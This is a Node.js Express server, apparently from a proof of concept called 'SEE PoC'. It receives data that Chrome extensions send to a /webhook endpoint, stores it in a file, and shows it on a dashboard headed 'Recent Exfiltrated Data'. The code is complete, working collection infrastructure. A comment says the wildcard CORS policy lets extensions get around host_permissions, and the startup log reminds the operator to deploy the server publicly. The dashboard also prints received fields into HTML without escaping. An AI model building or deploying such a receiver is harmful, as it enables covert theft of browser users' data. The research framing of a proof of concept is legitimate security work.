const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.jsonl');

// ==========================================
// THE CRITICAL VULNERABILITY COMPONENT
// ==========================================
// This permissive CORS header is what allows the Chrome extensions
// to send data via fetch() WITHOUT needing host_permissions.
app.use(cors({ origin: '*' }));

// Parse JSON bodies
app.use(express.json());

// In-memory array for the dashboard
let receivedData = [];

// Load existing data if any
if (fs.existsSync(DATA_FILE)) {
    try {
        const lines = fs.readFileSync(DATA_FILE, 'utf8').split('\n').filter(Boolean);
        receivedData = lines.map(JSON.parse);
    } catch (e) {
        console.error("Error reading data file", e);
    }
}

// ------------------------------------------
// Webhook Endpoint (Receives Data from Extensions)
// ------------------------------------------
app.post('/webhook', (req, res) => {
    const payload = req.body;
    
    // Validate payload
    if (!payload || !payload.extension) {
        return res.status(400).json({ error: 'Invalid payload' });
    }

    const dataEntry = {
        id: Date.now().toString(),
        receivedAt: new Date().toISOString(),
        ip: req.ip || req.connection.remoteAddress,
        ...payload
    };

    console.log(`[${dataEntry.receivedAt}] Data received from extension: ${payload.extension}`);

    // Store in memory (keep last 1000)
    receivedData.unshift(dataEntry);
    if (receivedData.length > 1000) receivedData.pop();

    // Append to file
    fs.appendFile(DATA_FILE, JSON.stringify(dataEntry) + '\n', (err) => {
        if (err) console.error("Failed to write to file", err);
    });

    res.json({ status: 'success', message: 'Data logged successfully' });
});

// ------------------------------------------
// Dashboard UI Endpoint
// ------------------------------------------
app.get('/', (req, res) => {
    // Generate simple HTML dashboard
    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SEE PoC Dashboard</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
            .container { max-width: 1000px; margin: 0 auto; }
            h1 { color: #38bdf8; border-bottom: 1px solid #334155; padding-bottom: 10px; }
            .stats { display: flex; gap: 20px; margin-bottom: 30px; }
            .stat-box { background: #1e293b; padding: 20px; border-radius: 8px; flex: 1; border: 1px solid #334155; }
            .stat-box h3 { margin: 0 0 10px 0; color: #94a3b8; font-size: 14px; text-transform: uppercase; }
            .stat-box .value { font-size: 28px; font-weight: bold; }
            table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 8px; overflow: hidden; }
            th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #334155; }
            th { background: #0f172a; color: #94a3b8; font-weight: 600; }
            tr:hover { background: #334155; }
            .ext-badge { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
            .ext-ce { background: rgba(239,68,68,0.2); color: #f87171; }
            .ext-uprof { background: rgba(59,130,246,0.2); color: #60a5fa; }
            .ext-lf { background: rgba(245,158,11,0.2); color: #fbbf24; }
            .ext-hh { background: rgba(16,185,129,0.2); color: #34d399; }
            .ext-udown { background: rgba(139,92,246,0.2); color: #a78bfa; }
            pre { margin: 0; white-space: pre-wrap; font-size: 12px; color: #cbd5e1; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>SEE PoC Monitoring Dashboard</h1>
            
            <div class="stats">
                <div class="stat-box">
                    <h3>Total Requests</h3>
                    <div class="value">${receivedData.length}</div>
                </div>
                <div class="stat-box">
                    <h3>Server Status</h3>
                    <div class="value" style="color: #34d399;">Online</div>
                </div>
                <div class="stat-box">
                    <h3>CORS Policy</h3>
                    <div class="value" style="color: #ef4444; font-size: 18px;">Access-Control-Allow-Origin: *</div>
                </div>
            </div>

            <h2>Recent Exfiltrated Data</h2>
            <table>
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Extension</th>
                        <th>Data Payload</th>
                    </tr>
                </thead>
                <tbody>
                    ${receivedData.map(d => `
                    <tr>
                        <td>${new Date(d.receivedAt).toLocaleString()}</td>
                        <td><span class="ext-badge ext-${d.extension || 'unknown'}">${d.extension || 'Unknown'}</span></td>
                        <td><pre>${JSON.stringify(d.stats, null, 2)}</pre></td>
                    </tr>
                    `).join('')}
                    ${receivedData.length === 0 ? '<tr><td colspan="3" style="text-align:center;">No data received yet. Configure extensions to send to /webhook</td></tr>' : ''}
                </tbody>
            </table>
        </div>
        <script>
            // Auto refresh every 10 seconds
            setTimeout(() => window.location.reload(), 10000);
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

// Start server
app.listen(PORT, () => {
    console.log(`=================================================`);
    console.log(`SEE PoC Server running on port ${PORT}`);
    console.log(`Endpoint: http://localhost:${PORT}/webhook`);
    console.log(`Dashboard: http://localhost:${PORT}/`);
    console.log(`NOTE: Remember to deploy this to Render/Railway`);
    console.log(`=================================================`);
});
